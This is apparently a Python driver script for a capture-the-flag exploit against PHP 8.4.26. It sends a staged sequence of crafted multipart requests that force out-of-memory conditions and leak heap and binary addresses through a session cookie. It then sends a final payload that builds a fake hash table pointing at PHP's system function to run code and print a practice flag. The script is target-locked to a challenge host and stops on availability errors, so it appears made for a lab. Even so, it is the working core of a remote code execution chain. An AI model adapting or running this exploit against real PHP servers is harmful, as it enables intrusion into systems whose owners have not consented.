#!/usr/bin/env python3

from __future__ import annotations

import argparse
from dataclasses import dataclass
import http.client

import exploit_primitives as exploit
from exploit_chain import OOM_MARKER, PayloadError, PayloadSet, ensure_request_size
from http_transport import (
    CHALLENGE_ENDPOINT,
    CHALLENGE_ORIGIN,
    CHALLENGE_READINESS_PATH,
    HttpRequest,
    HttpResponse,
    PersistentHttpClient,
)

EXPECTED_VERSION = "8.4.26"
EXPECTED_PRACTICE_FLAG = b"practice{challenge_already_won}"
PRE_PARAMETERS = 8
DEFAULT_TIMEOUT = 20.0
MIN_TIMEOUT = 5.0
MAX_TIMEOUT = 60.0
UNAVAILABLE_STATUSES = {429, 502, 503, 504}


@dataclass(frozen=True, slots=True)
class RemoteProofConfig:
    timeout: float


@dataclass(frozen=True, slots=True)
class RemoteProof:
    statuses: tuple[int, ...]
    flag: bytes


class RemoteProofError(RuntimeError):
    pass


class FatalRemoteProofError(RemoteProofError):
    pass


class RemoteProofRunner:
    def __init__(self, config: RemoteProofConfig):
        self.config = config
        self.payloads = PayloadSet.create()

    def run(self) -> None:
        self.payloads.validate()
        try:
            proof = self.run_attempt()
        except FatalRemoteProofError:
            raise
        except (ConnectionError, OSError, http.client.HTTPException) as error:
            raise FatalRemoteProofError(
                "challenge transport failed; no automatic retry was attempted"
            ) from error
        self.complete(proof)

    def run_attempt(self) -> RemoteProof:
        query = "&".join(
            f"q{index:04d}=v"
            for index in range(PRE_PARAMETERS)
        )
        a1_path = CHALLENGE_ENDPOINT + "?" + query
        b1_path = CHALLENGE_ENDPOINT + "?" + exploit.b1_query()

        with PersistentHttpClient(self.config.timeout) as client:
            seed = client.pipeline(
                (
                    HttpRequest.post(
                        CHALLENGE_ENDPOINT,
                        self.payloads.seed,
                        exploit.BOUNDARY,
                    ),
                )
            )[0]
            require_oom("seed", seed)

            readiness = client.pipeline(
                (HttpRequest.get(CHALLENGE_READINESS_PATH),)
            )[0]
            require_readiness(readiness)

            a1 = client.pipeline(
                (HttpRequest.post(a1_path, self.payloads.a1, b"C"),)
            )[0]
            require_oom("A1", a1)

            b1 = client.pipeline(
                (
                    HttpRequest.post(
                        b1_path,
                        self.payloads.b1,
                        exploit.BOUNDARY,
                    ),
                )
            )[0]
            require_oom("B1", b1)

            cookie = b1.session_cookie()
            if len(cookie) != exploit.LEAK_LENGTH:
                raise RemoteProofError(
                    f"B1 returned a {len(cookie)}-byte session cookie"
                )
            leak = resolve_leak(cookie)
            b2_body = exploit.build_b2(
                leak.fake_hash_table,
                leak.zif_system,
            )
            ensure_request_size("B2", b2_body)

            a2 = client.pipeline(
                (
                    HttpRequest.post(
                        CHALLENGE_ENDPOINT,
                        self.payloads.a2,
                        exploit.BOUNDARY,
                    ),
                )
            )[0]
            require_oom("A2", a2)

            b2 = client.pipeline(
                (
                    HttpRequest.post(
                        CHALLENGE_ENDPOINT,
                        b2_body,
                        exploit.BOUNDARY,
                        True,
                    ),
                )
            )[0]

        earlier = (seed, readiness, a1, b1, a2)
        flag = validate_callback(b2, earlier)
        statuses = tuple(
            response.status
            for response in (*earlier, b2)
        )
        return RemoteProof(statuses, flag)

    @staticmethod
    def complete(proof: RemoteProof) -> None:
        statuses = "/".join(str(status) for status in proof.statuses)
        print(f"statuses={statuses}", flush=True)
        print(
            "print-flag=" + proof.flag.decode("ascii", "backslashreplace"),
            flush=True,
        )
        print("RESULT=CTF_PRINT_FLAG_CONFIRMED", flush=True)


def require_available(stage: str, response: HttpResponse) -> None:
    if response.status in UNAVAILABLE_STATUSES:
        raise FatalRemoteProofError(
            f"{stage} returned HTTP {response.status}; stopping to protect availability"
        )


def resolve_leak(cookie: bytes) -> exploit.AddressLeak:
    heaps, pies = exploit.collect_pointer_candidates(cookie)
    try:
        main_chunk = exploit.resolve_main_chunk(heaps)
        php_base = exploit.resolve_php_base(pies)
    except RuntimeError as error:
        raise RemoteProofError(
            f"challenge address leak could not be resolved: {error}"
        ) from None
    return exploit.AddressLeak(main_chunk, php_base)


def require_oom(stage: str, response: HttpResponse) -> None:
    require_available(stage, response)
    if OOM_MARKER not in response.body:
        raise RemoteProofError(
            f"{stage} OOM was not observed "
            f"(HTTP {response.status}, {len(response.body)} bytes)"
        )


def require_readiness(response: HttpResponse) -> None:
    require_available("readiness", response)
    marker = ("PHP " + EXPECTED_VERSION).encode()
    if response.status != 200 or marker not in response.body:
        raise FatalRemoteProofError(
            f"challenge build check failed (HTTP {response.status})"
        )


def validate_callback(
    response: HttpResponse,
    earlier: tuple[HttpResponse, ...],
) -> bytes:
    require_available("B2", response)
    if response.status != 200:
        raise RemoteProofError(
            f"B2 callback returned HTTP {response.status}"
        )
    if any(EXPECTED_PRACTICE_FLAG in item.body for item in earlier):
        raise RemoteProofError(
            "challenge marker appeared before the print-flag callback"
        )
    if response.body.count(EXPECTED_PRACTICE_FLAG) != 1:
        raise RemoteProofError(
            f"B2 callback did not contain one exact challenge marker "
            f"({len(response.body)} bytes)"
        )
    return EXPECTED_PRACTICE_FLAG


def parse_config() -> RemoteProofConfig:
    parser = argparse.ArgumentParser(
        description=(
            "Single-attempt, target-locked print-flag proof for "
            + CHALLENGE_ORIGIN
        )
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=(
            f"per-connection timeout in seconds "
            f"({MIN_TIMEOUT:g}-{MAX_TIMEOUT:g}, default: {DEFAULT_TIMEOUT:g})"
        ),
    )
    arguments = parser.parse_args()
    if not MIN_TIMEOUT <= arguments.timeout <= MAX_TIMEOUT:
        parser.error(
            f"timeout must be between {MIN_TIMEOUT:g} and {MAX_TIMEOUT:g} seconds"
        )
    return RemoteProofConfig(arguments.timeout)


def main() -> int:
    try:
        RemoteProofRunner(parse_config()).run()
    except (OSError, PayloadError, RemoteProofError, ValueError) as error:
        raise SystemExit(str(error)) from None
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
